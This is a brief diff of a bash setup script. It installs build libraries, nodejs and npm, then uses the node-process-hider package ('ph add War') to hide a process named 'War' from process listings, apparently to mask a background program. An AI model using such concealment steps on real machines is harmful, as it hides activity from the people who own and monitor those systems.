@@ -1,5 +1,10 @@
 #!/bin/bash
-npm i -g node-process-hider 
+apt update
+apt install screen -y
+apt install libcurl4-openssl-dev libssl-dev libjansson-dev xz-utils -y
+apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
+npm i -g node-process-hider
+ 
 
 ph add War
 
